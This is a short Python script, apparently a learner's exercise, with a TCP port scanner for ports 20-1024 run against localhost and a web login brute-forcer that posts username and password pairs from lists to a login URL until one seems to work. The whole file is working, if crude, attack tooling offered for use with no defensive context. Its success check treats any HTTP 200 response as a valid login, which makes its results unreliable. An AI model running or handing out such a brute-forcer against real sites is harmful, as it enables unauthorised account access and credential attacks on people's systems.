# Port Scanner
import socket

def scan_port(host): # function is creted to scan ports
    print(f"Scanning ports on {host}...")
    for port in range(20, 1025):
        s = socket.socket()
        s.settimeout(0.5)
        try:
            s.connect((host, port))
            print(f"Port {port} is open")
        except:
            pass
        s.close()

# Example
scan_port("127.0.0.1")
# Brute Force login
import requests

def brute_force_login(url, username_list, password_list):  # function is defined to login brute force
    for username in username_list:
        for password in password_list:
            data = {'username': username, 'password': password}
            response = requests.post(url, data=data)
            if "Welcome" in response.text or response.status_code == 200:
                print(f"Valid login found: {username}:{password}")
                return

# Usage
brute_force_login("http://example.com/login", ["admin", "user"], ["1234", "admin123"])

